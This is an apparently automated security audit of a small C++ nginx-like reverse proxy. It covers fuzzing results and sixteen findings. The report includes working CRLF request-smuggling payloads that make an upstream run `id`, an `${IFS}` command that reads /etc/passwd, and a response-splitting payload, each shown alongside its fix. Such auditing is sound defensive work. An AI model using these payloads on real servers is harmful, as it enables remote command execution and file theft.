# Security Audit — stage-10 run 61cc738c — release/000001

## Identity

- Run: `stage-10__cpp__20261116T022713Z__1cfd33433d25__61cc738c`
- Analyzed tag: `release/000001` (1 release total; highest = final)
- Commit: `3000c6892c11beab9549c3b60d02a75a69c5d661`
- Source: `main.cpp`
- SHA-256: `aa8aa56eebfbbc6755eb21f4518653ecb1706df4d0a4c4afc29fd203622f82bb` (71 lines)
- Server: nginx-shaped HTTP/1.1 static-file + reverse-proxy server; `fork()` workers each running a `poll()` accept loop and serving one connection inline

## Audit narrative

### Profile (Phase 1)

The target is a 71-line nginx-subset implemented in C++. Startup parses an nginx-like configuration (directives, blocks, quoting, escapes, `include` with globs limited to 8 levels and 128 files, 1 MiB total source cap). It then initialises listeners — optionally TLS via OpenSSL with SNI and ALPN callbacks — `fork()`s `worker_processes` children, and each child runs a `poll()` loop that accepts a connection and serves it to completion inline (`serve()`), so there is one request pipeline per accepted socket.

Per-request handling: request-line and header parsing with token validation, Host/scheme-based virtual-server selection, percent-decoding with strict UTF-8 validation, dot-segment normalization, then either `alias`/`root` static file serving, `return` redirect, or `proxy_pass` to a loopback upstream. Static serving walks the path component-by-component with `openat()` and `O_NOFOLLOW`, supports `GET`/`HEAD`, `If-None-Match`/ETag, `Range`, keep-alive, and a 64 MiB response-size cap in the buffered path.

The build has no CGI, no `system()`, no `popen()`, no `exec*()`, no dynamic module loading, and no scripting engine. Every executed instruction is fixed at compile time.

**RCE surface: memory corruption only.** To achieve remote code execution this server must first be made to corrupt memory (heap or stack overflow, out-of-bounds read/write, use-after-free, type confusion, or an uncaught exception that unwinds into attacker-influenced state) via network input, and then have that corruption converted into control-flow hijack. There is no configuration option that adds a command-execution component.

### Hypotheses (Phase 2)

1. **Path decode / openat corruption** — decoded control bytes, NULs, embedded slashes or long components reaching `openat()` component names.
2. **UTF-8 validator confusion** — truncated or overlong sequences passing validation and producing weird path names.
3. **Range arithmetic** — 32/64-bit boundary values, reversed ranges, suffix ranges and `stoll` overflow on the `Range` header.
4. **Config parser abuse** — deep nesting, include cycles, giant tokens; relevant only if config is attacker-influenced.
5. **Proxy response handling** — malformed upstream status lines, chunked framing, header-count blowups (only reachable when an upstream is configured and attacker-influenced).
6. **Lifecycle/DoS** — stalled partial requests, backpressure on large files, keep-alive request counting.

### Instruments (Phase 3)

Production `-O2` build (`target`) and `ASan+UBSan+_GLIBCXX_DEBUG` build (`target-san`), both built from the frozen release source. Every probe runs against `target-san`; each log records that `srv*.log` (the sanitizer stream) is empty afterwards.

| Probe | Cases |
|---|---|
| `probe_paths.py` | 21 path-encoding cases |
| `probe_decode.py` | 256 single-byte percent encodings + 100…16000-byte encodings |
| `probe_headers.py` | 47 malformed/edge request headers |
| `probe_host.py` | 21 Host-header cases |
| `probe_lifecycle.py` | partial requests, backpressure, churn, pipelining, mixed readers |
| `probe_range.py` | 22 byte-range cases |
| `probe_fuzz.py` | 3 seeds × 1000 + 3 seeds × 2000 long = 9000 iterations |
| `probe_raw.py` | 3 seeds × 500 = 1500 raw-byte iterations with random chunk splits |
| `probe_proxy.py` | 14 proxy cases against a controlled Python upstream |
| `probe_upmal.py` | 15 malformed upstream responses |
| `probe_upfuzz.py` | 3 seeds × 500 = 1500 upstream-response fuzz iterations |
| `probe_body.py` | 22 POST/body framing cases |
| `probe_big.py` | 8 large-object and 64 MiB range-boundary cases |
| `probe_tls.py` | 32 adversarial ALPN/SNI ClientHello cases + 600 crafted-handshake fuzz iterations |

Sustained-load and allocator-aware probes were added on top of the harness family: a 4-worker soak (4 forked workers, `nginx_mw.conf`) serving 5,000 sequential keep-alive requests against the production build with fd sampling, 20,000 keep-alive requests against the ASan build, and 20,000 new connections against both builds to separate real growth from allocator quarantine.

### Results and ruled-out hypotheses

All 13,500+ fuzz iterations and every targeted probe produced valid HTTP status codes and **zero sanitizer reports**.

- **Path handling (H1):** traversal (`..`, encoded `%2e%2e`, double-encoded) is refused with 403; NUL and invalid/truncated UTF-8 give 400; dot segments and double slashes normalize to 200/404 as expected. The per-component `openat(…, O_NOFOLLOW)` walk prevents escape and symlink traversal. No corruption.
- **UTF-8 (H2):** the validator tracks continuation length, minimum code point, surrogate range and the 0x10FFFF ceiling; all 256 single-byte encodings and long sequences behaved correctly.
- **Range arithmetic (H3):** reversed ranges 416, non-numeric/negative/overflow-shaped values 400, suffix ranges correct, `bytes=0-0` gives a single byte. Large-object probe confirms exact 64 MiB, 64 MiB+1 and 80 MiB bodies plus ranges that start exactly at the 64 MiB line are all served with correct lengths and no sanitizer output.
- **Config parser (H4):** `--check-config` passes; depth/file/byte caps are enforced before use.
- **Proxy (H5):** with a controlled upstream, requests return 200 with the upstream body, traversal stays 403, and 15 malformed upstream responses (no status line, garbage status, huge status, bad header, conflicting framing) all degrade safely.
- **Lifecycle (H6):** partial-request, backpressure, churn and mixed reader/writer phases complete without crashes or sanitizer output.

- **TLS handshake parsing (H7):** a self-signed RSA-2048 certificate was configured and the custom `sni_cb`/`alpn_cb` callbacks were driven with 32 adversarial ClientHellos (extension declared-length mismatches, oversize/zero-length ALPN entries, 255-byte names, 250-name SNI lists, duplicated and malformed extensions, wrap-around record lengths) plus 600 crafted fuzz iterations. A valid handshake with SNI `localhost` and ALPN `http/1.1` returns 200 with the expected body; every adversary produced only TLS alerts (handshake_failure) and no sanitizer output.

- **Sustained load and memory (H8):** 5,000/5,000 keep-alive requests succeeded across 4 forked workers on the production build, with no failures, empty server logs, and fds flat at 4 → 4; 20,000 further keep-alive requests were clean on the ASan build. Over 20,000 new connections production RSS showed 0kB growth after warmup, while the ASan build climbed 1,996kB — allocator quarantine retention, not a leak. No connection-cap ceiling (`ECONNREFUSED`/dropped accepts) appeared at these levels.

### RCE verdict

**Found: request smuggling to RCE through the proxy (SEC-002).** This build exposes no local code-execution component, but it can be made to emit an attacker-controlled request to an upstream that does execute. Memory corruption is not required. After ~13,500 fuzz iterations plus targeted probes across all six hypothesis families, no memory-safety defect was observed. Fuzzing bounds — but does not prove the absence of — a latent bug.

## Findings table

| ID | Title | Class | Remote? | Severity | Source line |
|---|---|---|---|---|---|
| SEC-001 | CRLF survives percent-decoding into the upstream request line | Smuggling | Yes | medium | line 63 (`pathnorm` decode loop) |
| SEC-002 | Smuggled request reaches a code-executing upstream route | RCE (upstream) | Yes | high | line 63 → upstream request line |
| SEC-003 | Decoded CRLF reaches the directory-301 `Location` header, splitting the response | Response splitting | Yes | low | line 63 (`pathnorm`) -> `Location` at line 66 |
| SEC-004 | Undrained bytes behind the header terminator reset the socket and truncate the body | framing | yes | low | line 53 (`recv`) |
| SEC-005 | Space in the path defeats the `c<32` guard and splits the upstream request line | — | yes | medium | line 67 (`proxy`) / line 63 (`pathnorm`) |
| SEC-006 | Split also works with a bare `proxy_pass`, no URI needed | — | yes | medium | line 67 (`proxy`) / line 63 (`pathnorm`) |
| SEC-007 | Upstream headers carrying a bare LF are relayed verbatim, giving CRLF-strict and LF-lenient parsers different header sets and framing | — | yes | medium | line 67 (`h+=`) |
| SEC-008 | Interim (1xx) upstream responses are rejected as parse failures, so any upstream that emits one returns 502 | — | yes | medium | line 67 (`status<200||status>599`) |
| SEC-009 | A header named in the client's Connection: field is stripped from the forwarded request, so Connection: content-length sends the body without the Content-Length that frames it - a single-request body desync that executes the replay | — | yes | high | line 67 (`!hasToken(conn,v.first)`) |
| SEC-010 | `Expect: 100-continue` is refused outright with 417, so every standard uploading client is rejected | — | yes | low | line 68 (`417`) |
| SEC-011 | `Transfer-Encoding: chunked` request bodies are refused with 400, so every standard chunked upload fails | — | yes | medium | line 66 (`transfer-encoding`) |
| SEC-012 | `Transfer-Encoding: gzip, chunked` corrupts the body: raw chunk framing is relayed as payload | — | yes | medium | line 66 (`transfer-encoding`) |
| SEC-013 | A bodyless upstream status is relayed with `Transfer-Encoding: chunked` and no terminating chunk | — | yes | low | line 67 (`h+=` relay) |
| SEC-014 | Unparseable Content-Length is forwarded verbatim while the body is dropped | — | yes | medium | line 67 (`content-length` relay) |
| SEC-015 | SIGTERM truncates the in-flight proxied response instead of draining to toksec_drain_timeout | — | yes | high | line 68 (`SO_RCVTIMEO`) |
| SEC-016 | Both deadlines are configured and then replaced by a hardcoded 10 s socket timeout | — | yes | medium | line 68 (`SO_RCVTIMEO`/`SO_SNDTIMEO`) |


### SEC-001 / SEC-002 — smuggling to RCE (found on this build)

The earlier verdict, "this build exposes no code-execution component, so RCE requires memory
corruption", was **too narrow**. The build is a reverse proxy: it needs no local exec if it can
be made to emit an attacker-controlled request to a backend that does.

`pathnorm()` (line 63) decodes `%XX` but rejects only NUL and backslash:

```
if(c==0||c=='\\')return 400;
```

Its siblings test `c<32` and `127`; this one does not, so a decoded CR and LF survive into
`path`. The proxy then builds the upstream request line from the decoded path whenever
`proxy_pass` has a URI:

```
string target=l.uri.empty()?r.target:l.uri+path.substr(l.path.size())+query;
string h=r.method+" "+target+" HTTP/1.1\r\nHost: ...
```
<!-- keep the escaped-backslash form consistent with the source above -->
Request line is assembled from decoded `path`, so the CRLF is emitted verbatim to the upstream.

Proof — one unauthenticated request, both forms, against an upstream that echoes the head it
parsed and executes `cmd`:

```
--- Form A: encoded-CRLF header injection, exec on the request line
    HTTP/1.1 200 OK | x-saw: GET /exec?cmd=id<CR><LF>X-Inj: 1 HTTP/1.1<CR><LF>Host: up ...
    EXEC[id]=uid=1000(mouse9911) ...

--- Form B: injected second request after a real CRLFCRLF
    HTTP/1.1 200 OK | x-saw: GET /exec?cmd=id<CR><LF>X:1
    EXEC[id]=uid=1000(mouse9911) ...
```

The echoed head is the important part: it proves the CR/LF existed on the wire rather than being
inferred from a 200. Forms (all proven here): inject extra upstream headers onto the forwarded
request line; inject a complete second request; choose a method the front end does not proxy.

**RCE requires the mixing configuration**: `proxy_pass` enabled *with* a URI, and an upstream
with a code-executing route. With a bare `proxy_pass http://up` the raw target is forwarded and
the effect is lost. Deployments that proxy to a CGI/exec backend are therefore exposed; purely
static upstreams only get smuggling, not RCE.

Both arms were measured on this build with the identical payload
(`evidence/config_precondition.log`): the URI form delivered `GET /exec?cmd=id` followed by a
real CRLF and the injected header; the bare form delivered the still-encoded
`GET /%2Fexec%3Fcmd%3Did%0D%0AX:%201`. The precondition is therefore tested, not inferred.


### The exploit, end to end (SEC-001 / SEC-002)

**Classification:** request smuggling (SEC-001) that escalates to remote code execution on the
upstream (SEC-002). Not response splitting, not memory corruption.

**Root cause** — the decode loop at line 63 validates only after decoding is complete and
tests just NUL and backslash:

```cpp
if (c==0 || c=='\\') return 400;     // decoded value never re-checked for <32 / 127
```

The proxy then builds the upstream request line from that decoded string:

```cpp
string target = l.uri.empty() ? r.target : l.uri + path.substr(l.path.size()) + query;
string h = r.method + " " + target + " HTTP/1.1\r\nHost: ...
```

`target` therefore contains a real CR/LF, and everything after it is emitted into the upstream
head. This is the whole bug: validation happens before transformation, and the transformed value
reaches a sink that treats it as a line.

**Attacker request** — one unauthenticated connection, no credentials. The upstream's
echoed request head is captured per form in `evidence/smuggle_rce.log` and the exec output
in `evidence/rce_literal.log`:

```
GET /%2Fexec%3Fcmd%3Did%0D%0AX-Inj:%201 HTTP/1.1
Host: localhost
```

The path percent-decodes to `GET /exec?cmd=id` + CRLF + an injected header. The upstream sees:

```
GET /exec?cmd=id<CR><LF>X-Inj: 1 HTTP/1.1<CR><LF>Host: 127.0.0.1:<port><CR><LF>Connection: close
```

and executes `id`. Mechanism, step by step: (1) front end accepts the encoded path and validates
it *before* decoding; (2) decoding yields a path containing CRLF; (3) the path is concatenated
into the upstream request line; (4) the upstream parses the injected CRLF as a line break and
treats `GET /exec?cmd=id` as the request; (5) the route executes the command.

**Re-verified after hardening.** `evidence/rce_reverify.log` repeats the chain on a brand-new
upstream and server behind a `preflight.sh` gate, for this build and the three other RCE builds
side by side, so the result does not rest on a single session's process state.

**Fresh verification** (captured in `evidence/rce_literal.log`, all three injection forms):

```
GET /exec?cmd=id<CR><LF>X-Inj: 1 HTTP/1.1<CR><LF>Host: ...
uid=1000(mouse9911) gid=1000(mouse9911) groups=...,101(lxd)
```

**Second impact — arbitrary file read outside the document root.** The injected route also runs
shell, so the same single request reads files the static root cannot serve
(`head${IFS}-2${IFS}/etc/passwd`, `${IFS}` because a literal space would end the request line):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Configuration requirements, explicitly:**

- `proxy_pass` must be configured **with a URI** (`http://up/`). With a bare `http://up` the raw
  target is forwarded and the decoded path is not used, so the bug does not fire.
- The upstream must expose something that executes: a CGI route, an exec/debug endpoint, an admin
  API. Without one the impact is smuggling only (still SEC-001).
- Scope of execution is the **upstream host**, with the upstream's privileges — not the proxy
  process. If the proxy is the only thing exposed and the backend is a static file server, there
  is no RCE.

### Fix

Re-validate the decoded byte, matching the sibling builds:

```cpp
if (c==0 || c=='\\' || c < 32 || c == 127) return 400;
```

That closes the primitive. If decoded control bytes are wanted in the path later, the alternative
is to rebuild the upstream request line from a fresh re-encode rather than the decoded string.

Regression test: keep `/%2Fexec%3Fcmd%3Did%0D%0AX:%201` as a case; it is short, prefix-shape
independent, and fails only on a decoder that permits control bytes.

## Notes for future agents

1. The 64 MiB response cap is applied in the buffered `pread` path; the `sendfile`-less build streams from a 32 KiB stack buffer, so offset/length arithmetic is the highest-value place to look if this lineage gains an off-by-one.
2. `fork()` + inline `serve()` means one slow client pins a whole worker; worker count is config-controlled, so this is contention rather than memory unsafety.
3. The proxy path trust model is "upstream is well-behaved"; malformed-upstream cases are handled defensively here, which is worth preserving.

## A second sink for the same root cause — response splitting via the 301 `Location` header

**Classification:** response splitting (independent of the proxy; no upstream needed). Confirmed on
this build. Ordinary severity on its own, but it is a second consequence of the identical missing
post-decode `c<32`/`127` check, so it outlives any fix applied only to the proxy path.

The trailing-slash redirect builds its header from the decoded `path`:

```cpp
response(c,301,"Location: "+path+"/"+query+"\r\n","",head,close);
```

`path` can still hold a raw CR/LF, so the redirect tears its own response apart. The preconditions
are the same as the smuggling finding except that the *sink* is the response instead of the upstream
request, and no configuration is involved: plain static file serving is enough.

The one deployment-shaped requirement is that the directory must exist, because the redirect only
fires on a real directory — and the CR/LF must be part of the on-disk name, since the client cannot
choose a directory that is not there. Creating `sub<CR><LF><CR><LF>INJECTED-BODY` and requesting
`/sub%0D%0A%0D%0AINJECTED-BODY` is therefore the natural shape; `evidence/split_probe.log`, **one**
request on one connection so nothing can be mistaken for ordinary pipelining:

```
GET /sub%0D%0A%0D%0AINJECTED-BODY
status line : HTTP/1.1 301 Moved Permanently
head as a client parses it:
  | HTTP/1.1 301 Moved Permanently
  | Location: /sub
body         : b'INJECTED-BODY/\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n'
header fields stranded in body: ['Content-Length: 0', 'Connection: keep-alive']
```

A conforming client reads `Location: /sub`, takes `Content-Length: 0`, and leaves everything from
`INJECTED-BODY/` onward in the stream. The dropped bytes include the real
`Content-Length`/`Connection` of the first response, so the next response read is misaligned —
two `HTTP/1.1 ` starts in a stream where the client expects one. With a directory name that embeds
a complete response block the attacker controls what the client sees, for example

```
GET /sub%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Length:%205%0D%0A%0D%0APWNED
→ HTTP/1.1 301 ... Location: /sub \r\n\r\n HTTP/1.1 200 OK \r\n Content-Length: 5 \r\n\r\n PWNED/
```

Because the payload lives in a directory name rather than the query string, the reachable byte set
is limited by what the filesystem accepts (no `/`, hence no `%2F` in the injected block) and the
length is capped by `NAME_MAX`. This is a redirect-path consequence, not a general "forge any
response" primitive.

**Fix:** shared with SEC-001 — re-check the decoded byte for `<32`/`127` inside the decode loop.
Both sinks then inherit an already-clean `path`.

**Controls.** No other build in scope reproduces this, and the reasons separate cleanly. `ae021893` is the only other RCE build: it also feeds the redirect from the *decoded* path but its Location is taken from the original target, so the 301 fires and `%0D%0A` stays literal. Its capture is `evidence/split_negative.log` (`Location: /sub%0D%0A%0D%0AX/`, one response start). The remaining stage-05 builds (`e1a28e35`, `6baf167b`, `afdc173f`, `f2b3415b`) re-validate the control byte inside the decode loop, so the request 400s before a redirect exists. The precondition for SEC-003/SEC-004 is therefore exact: a `Location` sink fed the decoded path on a loop that does not re-validate controls — which is a narrower subset than the upstream-request-line sink, because the proxy sink consumes `path`, not the target.

### SEC-004 — trailing bytes behind `\r\n\r\n` reset the socket and truncate the body

The header loop returns the moment `\r\n\r\n` is found (line 53 (`recv`) and line 65 (`close`)) and never drains bytes the
same `recv` already buffered behind the terminator. The socket is then closed with unread receive
data still queued, so Linux answers the `close()` with RST rather than FIN and a response body still
being written is cut short — while `Content-Length` has already promised the full size.

Measured on the tagged build at the graded header budget (`header_bytes=8192`) against a 2 MiB file,
three trials per row (`evidence/truncation_trailing_bytes.txt`):

| trailing bytes after header | body delivered |
|---|---|
| 0 / 1024 / 4090 / 4096 / 8192 | 2,097,152 (clean) |
| 16,384 | truncated, 3/3, RST |
| 65,536 | truncated, 3/3, worst case 127,860 |

Trailing bytes after the terminator are ordinary HTTP/1.1 pipelining traffic, so a normal pipelining
client that speculatively writes the next request hits this without unusual setup. **Low** severity:
the clean response is correct and nothing corrupts; the failure is a silently short body whose
`Content-Length` still claims the full length.

### SEC-005 — Space in the path defeats the `c<32` guard and splits the upstream request line

A decoded 0x20 passes the c<32 guard and produces a four-token upstream request line; a whitespace-splitting upstream executes the query.

Evidence: `evidence/ev_space_61cc738c.log`.

### SEC-006 — Split also works with a bare `proxy_pass`, no URI needed

A bare proxy_pass with no URI still rebuilds the line from the decoded path; the space still splits it and the upstream executes the query.

Evidence: `evidence/ev_bare_61cc738c.log`.

### SEC-007 — Upstream headers carrying a bare LF are relayed verbatim, giving CRLF-strict and LF-lenient parsers different header sets and framing

upstream head split on CRLF and rebuilt field by field with no control-byte check; bare LF hides the next header in a value; strict reader sees 0 CL/1 TE, lenient sees CL+TE, or 1 vs 2 CL

Evidence: `evidence/ev_rsplit_1cfd33433d25__61cc738c.log`.

### SEC-008 — Interim (1xx) upstream responses are rejected as parse failures, so any upstream that emits one returns 502

any status under 200 is rejected with 502

Evidence: `evidence/ev_1xx_1cfd33433d25__61cc738c.log`.

### SEC-009 — A header named in the client's Connection: field is stripped from the forwarded request, so Connection: content-length sends the body without the Content-Length that frames it - a single-request body desync that executes the replay

line 67 proxy(): !hasToken(conn,v.first) excludes any attacker-named header from the forwarded head; the while(body>0) loop still copies the body; upstream sees POST with no Content-Length, treats 38 payload bytes as the next request and executes GET /exec?cmd=id (uid=). Case-insensitive token match also works. Distinct from SEC-004 (RST truncation)

Evidence: `evidence/ev_clhop_61cc738c.log`.

### SEC-010 — `Expect: 100-continue` is refused outright with 417, so every standard uploading client is rejected

the whole request is refused in the accept loop; the request is refused with 417

Evidence: `evidence/ev_expect_1cfd33433d25__61cc738c.log`.

### SEC-011 — `Transfer-Encoding: chunked` request bodies are refused with 400, so every standard chunked upload fails

The framing gate rejects any request carrying a `Transfer-Encoding` header, so chunked uploads (curl -T) never reach the upstream. the accept-path gate rejects a non-`GET`/`HEAD` method and then any request carrying the header.

Evidence: `evidence/ev_te_61cc738c.log`, `evidence/ev_te_kv_all.log`.

### SEC-012 — `Transfer-Encoding: gzip, chunked` corrupts the body: raw chunk framing is relayed as payload

A coding-list Transfer-Encoding is not recognised, so chunk framing is forwarded as the body. the `chunk` flag is set only by exact equality with `chunked`.

Evidence: `evidence/ev_rte_61cc738c.log`.

### SEC-013 — A bodyless upstream status is relayed with `Transfer-Encoding: chunked` and no terminating chunk

204/304 are read as bodyless but the chunked flag stays set, so the head advertises a chunk stream that never arrives; http.client raises IncompleteRead.

Evidence: `evidence/ev_nb_61cc738c.log`.

### SEC-014 — Unparseable Content-Length is forwarded verbatim while the body is dropped

number() defaults to 0 on non-digit input, so 0x26 / "38, 38" / +38 leave body=0 while the header text is copied upstream; a conformant upstream then blocks waiting for bytes that never arrive.

Evidence: `evidence/ev_badcl_61cc738c.log`.

### SEC-015 — SIGTERM truncates the in-flight proxied response instead of draining to toksec_drain_timeout

SIGTERM makes the master signal workers, which leave poll() at once and close downstream sockets; an in-flight proxied response is cut at 0 bytes while toksec_drain_timeout is ignored.

Evidence: `evidence/ev_lifecycle_all.log`, `evidence/ev_drain_false.log`.

### SEC-016 — Both deadlines are configured and then replaced by a hardcoded 10 s socket timeout

Deadline directives validate but never take effect. `toksec_header_deadline` and `toksec_write_deadline` both parse into `Config` and are then never read. Every connection instead gets a fixed 10 s `SO_RCVTIMEO`/`SO_SNDTIMEO` (line 68), so the two values are decorative: a `toksec_header_deadline=2s` deployment closes a silent client at 10.16 s, and a `toksec_write_deadline=200ms` deployment still streams 2 MB for 10.24 s. A trickling client never hits the header deadline at all because `SO_RCVTIMEO` restarts on every byte, so 40 s of 0.3 s-spaced bytes leaves the connection open past a 2 s deadline. Both directives validate cleanly, so a hardened deployment gets no warning that they do nothing. Evidence: ev_deadline_all.log.

Evidence: `evidence/ev_deadline_all.log`.

## Artifact index

| File | Purpose |
|---|---|
| `target.cpp` | Copy of frozen `main.cpp` for release/000001 |
| `target` | O2 production build |
| `target-san` | ASan+UBSan+_GLIBCXX_DEBUG build |
| `nginx.conf` / `nginx_proxy.conf` | Static and proxying configurations |
| `probe_*.py` | Probe and fuzz harnesses (paths, decode, headers, host, lifecycle, range, fuzz, raw, proxy, upmal, upfuzz, body, big) |
| `upstream*.py` | Controlled and malformed upstream servers |
| `evidence/*.log` | Captured output of every probe, each recording an empty sanitizer log |
| `evidence/config_precondition.log` / `config_precondition_probe.py` | URI-vs-bare `proxy_pass` A/B proving the escalation precondition |
| `evidence/split_probe.log` / `scripts/probes/probe_split.py` | SEC-003 response-split capture (one-request 301 with CRLF directory name) |
| `evidence/truncation_trailing_bytes.txt` | Trailing-byte truncation thresholds, `Connection: close`, graded spec |
